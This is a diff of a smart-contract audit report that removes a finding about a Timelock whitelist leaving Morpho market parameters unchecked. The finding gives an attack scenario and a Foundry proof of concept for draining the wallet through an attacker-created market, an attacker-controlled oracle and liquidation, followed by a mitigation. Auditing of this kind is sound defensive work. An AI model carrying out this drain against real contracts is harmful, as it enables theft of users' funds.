@@ -35,37 +35,6 @@
   assertEq(safe.getThreshold(), 1, "requested 2-of-1 silently deployed as 1-of-1");
   ```
 
-## [LOW] Whitelist does not pin Morpho markets for `supplyCollateral`/`borrow`, letting a compromised hot signer drain the wallet via an attacker-created market and liquidation
-> **KLD-011** · Normalized: Medium
-- File: src/Timelock.sol:475-504 (checkCalldata), src/Timelock.sol:715-755 (executeWhitelisted/executeWhitelistedBatch); exposed by the reference whitelist configuration in test/integration/System.t.sol:280-295
-- Severity: High
-- Confidence: Medium
-- Description: `checkCalldata` verifies only the byte ranges declared by the configured `Index` entries, and the reference configuration pins `MarketParams` (market id) only for `supply` ([4,164), System.t.sol:292-298). For `supplyCollateral` only `onBehalf` ([208,228) — arg3 word6, last 20 bytes) is checked, and for `borrow` only `receiver` ([272,292) — arg5 word8, last 20 bytes). `MarketParams` is unconstrained for `supplyCollateral` and `borrow`. A hot signer can therefore park the timelock's tokens as collateral into ANY Morpho market — including a market the attacker creates (`createMarket` is permissionless; attacker supplies the oracle, loan token and liquidity) — and borrow max against it, then anyone (the attacker) liquidates the position, seizing the collateral to themselves. `liquidate` is permissionless and not whitelist-gated.
-- Attack scenario:
-  1. Attacker (or compromised hot signer) deploys a `FAKE` ERC20 and an oracle `O` it fully controls; calls `morpho.createMarket(MarketParams(loanToken=FAKE, collateralToken=weth, oracle=O, irm=0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC, lltv=915000000000000000))` (the fixture's enabled IRM and a governance-enabled LTV) and seeds FAKE liquidity directly via `morpho.supply(scamMarket, max, 0, attacker, "")` — required because `borrow` reverts with INSUFFICIENT_LIQUIDITY unless market supply exceeds the requested borrow.
-  2. Hot signer: `executeWhitelistedBatch([approve(weth, morpho, max)], [supplyCollateral(scamMarket, balance, timelock, "")])` — the whitelist checks only the last 20 bytes of `onBehalf` ([208,228) = timelock) and the approve spender ([16,36) = morpho); MarketParams is unconstrained — the timelock's entire WETH is posted into the attacker's market.
-  3. Hot signer: `executeWhitelisted(morpho, 0, borrow(scamMarket, 0, maxShares, timelock, timelock))` — only `receiver` ([272,292) = timelock) is checked; MarketParams/onBehalf/amounts unconstrained — borrows the max against the collateral while oracle `O` reports a favorable price.
-  4. Attacker reprices via `O` (collateral worth ≈ 0 in the market's terms) and calls `morpho.liquidate(scamMarket, timelock, exactCollateral, 0, "")` directly — liquidation is permissionless and not whitelisted; the seized WETH goes to `msg.sender` (attacker) and the FAKE debt is absorbed as bad debt against the attacker's own liquidity. Full loss of the collateral; repeatable for every asset the whitelist lets the wallet hold (DAI/eUSD via `withdraw`/`withdrawCollateral`+receiver, ETH via the WETH wrap wildcards), so the entire balance can be drained.
-- PoC (Foundry outline):
-  ```solidity
-  // attacker: FAKE (mintable ERC20) + oracle O (attacker-set price()); irM = fixture 0x870aC11D48b15Db9a138Cf899d20F13F79Ba00BC; lltv = 0.915e18
-  morpho.createMarket(MarketParams(FAKE, weth, O, IRM, 0.915e18));
-  morpho.supply(scamMarket, type(uint256).max, 0, attacker, ""); // liquidity: borrow requires totalSupplyAssets
-  deal(address(weth), address(timelock), 100 ether);
-  vm.prank(HOT_SIGNER);
-  timelock.executeWhitelistedBatch(
-      [weth, morpho], [0, 0],
-      [abi.encodeCall(IERC20.approve, (morpho, type(uint256).max)),
-       abi.encodeCall(IMorphoBase.supplyCollateral, (scamMarket, 100 ether, address(timelock), ""))]);
-  vm.prank(HOT_SIGNER);
-  timelock.executeWhitelisted(morpho, 0, abi.encodeCall(IMorphoBase.borrow, (scamMarket, 0, type(uint256).max, address(timelock), address(timelock))));
-  o.setPrice(1); // collateral ≈ worthless → unhealthy
-  morpho.liquidate(scamMarket, address(timelock), 100 ether, 0, ""); // seize all collateral to attacker
-  assertLt(weth.balanceOf(address(timelock)), 100 ether); // collateral gone
-  ```
-  Mitigation: add the market-params check [4,164) to the `supplyCollateral`, `borrow`, `withdraw` and `withdrawCollateral` whitelist entries (like the `supply` entry), i.e. only allow the predefined markets.
-
-
 ## Coverage
 - src/BytesHelper.sol
 - src/ConfigurablePause.sol
@@ -79,7 +48,6 @@
 - src/utils/Create2Helper.sol
 - src/utils/Constants.sol
 - src/deploy/SystemDeploy.s.sol
-- src/interface/IMorpho.sol
 - src/interface/CErc20Interface.sol
 - src/interface/CEtherInterface.sol
 - src/interface/IMulticall3.sol
